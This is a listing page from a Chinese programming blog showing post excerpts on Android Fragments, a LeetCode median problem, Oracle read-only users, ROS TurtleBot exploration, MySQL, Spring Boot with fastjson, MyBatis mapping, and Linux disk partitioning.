3. 创建Fragment .1. 静态加载 自定义Fragment 类 public class Fragmentone extends Fragment { @Override public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) { View view = inflater.inflate(R.layout.fragment1, container,false); return view; } } 在需要加载Fragment Activity 对应的布局文件中添加对应的fragment的标签 &lt;fragment android:id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/34d1427eb40045aecf0c5a72aa5307f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a57bb3d7eabbe5e43701bb11456a31f6/" rel="bookmark">
			leetcode4. 寻找两个正序数组的中位数python_二分查找和递归（困难）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目 给定两个大小分别为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。请你找出并返回这两个正序数组的 中位数 。算法的时间复杂度应该为 O(log (m+n)) 。
示例 1：
输入：nums1 = [1,3], nums2 = [2]
输出：2.00000
解释：合并数组 = [1,2,3] ，中位数 2
示例 2：
输入：nums1 = [1,2], nums2 = [3,4]
输出：2.50000
解释：合并数组 = [1,2,3,4] ，中位数 (2 + 3) / 2 = 2.5
提示：
nums1.length == m
nums2.length == n
0 &lt;= m &lt;= 1000
0 &lt;= n &lt;= 1000
1 &lt;= m + n &lt;= 2000
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a57bb3d7eabbe5e43701bb11456a31f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9068360ca5253c7762e4e5712030aa6/" rel="bookmark">
			ORACLE添加只读权限的用户
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.创建用户
&gt; CREATE USER 用户名 IDENTIFIED BY 密码; 2.创建只读的角色名称
&gt; CREATE ROLE READER_ROLE; --READER_ROLE 自定义的角色名称 3.给角色分配权限
&gt; grant SELECT ANY DICTIONARY to READER_ROLE; --READER_ROLE 自定义的角色名称 &gt; grant SELECT ANY TABLE to READER_ROLE; --READER_ROLE 自定义的角色名称 &gt; grant SELECT ANY TRANSACTION to READER_ROLE; --READER_ROLE 自定义的角色名称 &gt; grant SELECT ANY SEQUENCE to READER_ROLE; --READER_ROLE 自定义的角色名称 4.将只读角色赋予指定账户
&gt; grant READER_ROLE to 用户名; 5.给用户赋予连接权限
&gt; grant connect, resource to 用户名; &gt; grant create session to 用户名; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df20d66aad6a05218da5f0defb6f79da/" rel="bookmark">
			turtlebot2利用turtlebot_exploration_3d进行自主建图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装octomap_ros和rviz插件 sudo apt-get install ros-indigo-octomap* 源码安装：turtlebot_exploration_3d(本机为Ubuntu16对应的ros版本为kinetic，但是无对应的版本，用的是ubuntu14的indigo，版本向前兼容，故可以运行） cd turtlebot_ws/src git clone https://github.com/RobustFieldAutonomyLab/turtlebot_exploration_3d.git catkin_make deb包安装： sudo apt-get update sudo apt-get install ros-indigo-turtlebot-exploration-3d 运行：
主机端，新终端，执行： $ roslaunch turtlebot_exploration_3d minimal_explo.launch $ roslaunch turtlebot_exploration_3d turtlebot_gmapping.launch $ rosrun turtlebot_exploration_3d turtlebot_exploration_3d 从机端，新终端，执行： roslaunch turtlebot_exploration_3d exploration_rviz.launch 对应的脚本信息如下：
minimal_explo.launch：
&lt;launch&gt; &lt;!-- Turtlebot --&gt; &lt;arg name="base" default="$(env TURTLEBOT_BASE)"/&gt; &lt;!-- create, roomba --&gt; &lt;arg name="battery" default="$(env TURTLEBOT_BATTERY)"/&gt; &lt;!-- /proc/acpi/battery/BAT0 in 2.6 or earlier kernels--&gt; &lt;arg name="stacks" default="$(env TURTLEBOT_STACKS)"/&gt; &lt;!-- circles, hexagons --&gt; &lt;arg name="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df20d66aad6a05218da5f0defb6f79da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c10f243d65ded348ea2deb514f039f77/" rel="bookmark">
			MySQL进阶教程汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🚀前言 本文是MySQL进阶教程专栏的导航站（点击链接，跳转到专栏主页，欢迎订阅，持续更新…）
专栏介绍：以实战为线索，讲解MySQL系统架构、SQL语句优化、索引创建、服务器性能调优、系统配置管理和安全设置、监控分析，以及复制、扩展和备份/还原等主题。
专栏适用于人群：Web后端开发人员
专栏语言：文中例子采用C#实现
文章持续更新中……
如果文章对您有用，请点点赞，点点关注，点点收藏，也可以订阅专栏，您的支持是我前进的最大动力！
谢谢支持！
🔰 文章列表 ⭐️第一章：一次性导入千万级数据到Mysql（附源码） 文章简介：通过对比3种MySQL数据导入方式，分别对比万级、百万级、千万级导入性能，来实现如何高性能导入千万数据到MySQL。
⭐️第二章：MySQL索引原理与设计规范
文章简介：介绍索引的原理，索引的类别、索引的创建方法、以及创建规范 。
⭐️第三章：MySQL存储引擎MyISAM与InnoDB两者之前的区别
文章简介：对比这两种引擎的查询性能、存储结构、索引、MVCC维护等差别，以及这两种引擎使用的选择。
📝 最后 MySQL进阶教程专栏专栏的文章都在这里啦。
文章会持续更新,大家有想要了解的功能点或者话题,可以在评论区告诉我！
喜欢本专栏的文章，可以点赞、订阅支持一下，你的肯定是对我最大的支持！
也可以收藏本文章，收藏后可以快速查看本专栏后续更新的一系列文章！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77d00f8a0ccc6607a8a38a1dd6a2b170/" rel="bookmark">
			【springboot进阶】springboot集成fastjson（一）配置消息解析器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、引入依赖
二、配置方式
三、测试
这篇文章使用到的是springboot2.7.0 + fastjson2.0.6
一、引入依赖 springboot默认使用jackson作为json解析器，所以需要剔除这部分的依赖。
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.7.0&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;org.liurb&lt;/groupId&gt; &lt;artifactId&gt;springboot-fastjson&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;springboot-fastjson&lt;/name&gt; &lt;description&gt;springboot-fastjson&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;fastjson.version&gt;2.0.6&lt;/fastjson.version&gt; &lt;lombok.version&gt;1.18.24&lt;/lombok.version&gt; &lt;hutool.version&gt;5.8.3&lt;/hutool.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;!-- 剔除jackson --&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-json&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;${fastjson.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-all&lt;/artifactId&gt; &lt;version&gt;${hutool.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;${lombok.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/77d00f8a0ccc6607a8a38a1dd6a2b170/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3905d04e75e1c73eb4439623edebb00/" rel="bookmark">
			MyBtais的SQL映射文件(元素,查询,映射,动态SQL)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.概述
2.SQL映射文件元素
3.Mybatis框架的条件查询
3.1 单参数查询(模糊查询)
3.2 多参数查询
3.2.1 JavaBean 对象参数
3.2.2 Map 参数
3.2.3 @Param 注解 参数
3.2.4 底层顺序[param1,param2] 4.Mybatis框架的结果映射
4.1 resultMap自定义映射
4.1.1 ResultMap元素实现自定义结果映射
4.1.2 association 嵌套结果映射
4.1.3 collection 嵌套结果映射
4.1.4 resultType 和resultMap小结
4.1.5 自动映射配置
5.Mybtais框架的增删改操作
6.实现动态SQL
6.1 where + if 组合标签
6.2 choose 标签
6.3 foreach 标签
6.3.1foreach 元素
6.4 set 标签
6.5 trim 标签
6.5.1 trim标签中的元素
1.概述 在SQL映射文件中，只需根据MyBatis提供的标签写入SQL语句操作， 将SQL语句从程序的代码中分离出来，对JDBC访问数据库的代码进行封装,只需关注sql事务操作。
2.SQL映射文件元素 以下是SQL映射文件中的部分常用元素
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE mapper PUBLIC "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c3905d04e75e1c73eb4439623edebb00/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0db520722bd50e24bfa115909b1ba07/" rel="bookmark">
			Linux基础第五章：添加磁盘及如何使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、系统添加磁盘步骤及命令
1、本章使用命令
二、磁盘添加及分区挂载
1、添加硬件
2、磁盘分区
3、格式化分区
4、挂载分区及使用
5、永久挂载
三、本章节涉及面试题
1、如何添加磁盘并使用
2、划分大于2T磁盘使用什么命令
一、系统添加磁盘步骤及命令 服务器添加磁盘一共分为一下四步，我们将按以下步骤详细介绍如何在服务器上添加磁盘并使用。
①添加硬件
②磁盘分区
③格式化磁盘
④挂载磁盘
1、本章使用命令 ①/sys/class/scsi_host/host0/scan；/sys/class/scsi_host/host1/scan；/sys/class/scsi_host/host2/scan 用于添加硬件后刷新槽位让服务器识别到新添加的硬盘。
②lsblk 用于查看分区情况
③df -h 人性化显示挂载情况
④mkfs.xfs +分区，用于格式化分区
⑤partprobe 用于分区完成后分区不显示刷新分区情况
⑥fdisk +硬盘 用于硬盘分区2TB以下磁盘划分
⑦blkid 查看设备的uuid号
⑧gdish +硬盘 用于硬盘分区2TB以上磁盘划分
二、磁盘添加及分区挂载 1、添加硬件 ①在虚拟机的设置中点击添加，接着一直下一步直到完成，点击确定再关闭页面。如下图是添加成功的页面。
②添加完成后进入虚拟机执行命令使服务器识别新加的硬盘，命令添加成功截图如下。echo "- - -" &gt;/sys/class/scsi_host/host0/scan；echo "- - -" &gt;/sys/class/scsi_host/host1/scan；echo "- - -" &gt;/sys/class/scsi_host/host0/scan； 硬盘添加顺序是从sda开始到sdb一次类推，添加的第二块磁盘即是sdb
2、磁盘分区 磁盘分区分为主分区、扩展分区、逻辑分区，由于第一扇区空间有限只能存放4个主分区，为了解决这个问题使用扩展分区下的逻辑分区，扩展分区存储的是逻辑分区的范围，所以实际使用的是逻辑分区，扩展分区只用于存放逻辑分区的范围。接下来我们详细介绍划分主分区与扩展分区、逻辑分区。首先介绍划分主分区
①fdish /dev/sdb 对sdb磁盘进行分区进入人机交互界面，如下图。
②输入n表示添加分区，选择分区类型，p为主分区
③选择分区号，起始扇区，直接回车使用默认值，分区号1起始扇区2048开始
④设置分区大小，使用格式+n单位，大写的单位如下图+5G。设置完成后p查看分区情况，w保存退出
⑤至此主分区划分完毕，接下来介绍扩展分区、逻辑分区划分。同样的步骤dish /dev/sdb 对sdb磁盘进行分区进入人机交互界面，输入n添加分区。
⑥ 然后输入e添加扩展分区，分区号回车默认、起始扇区回车默认、然后设置扩展分区大小，格式和主分区一样+n单位，单位大写。如下图10G，然后w保存。
⑦扩展分区划分完毕后再进入划分逻辑分区，同样的步骤dish /dev/sdb 对sdb磁盘进行分区进入人机交互界面，输入n添加分区。此时输入l选择逻辑分区，回车默认起始扇区，然后设置逻辑分区大小，此处注意必须在扩展分区的大小范围内，小于10G，由于有所损耗可能扩展分区不满10G，此处划分5G给逻辑分区，然后p打印分区情况可以看到已经有逻辑分区sdb5，输入w保存退出。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a0db520722bd50e24bfa115909b1ba07/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/185/">«</a>
	<span class="pagination__item pagination__item--current">186/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/187/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>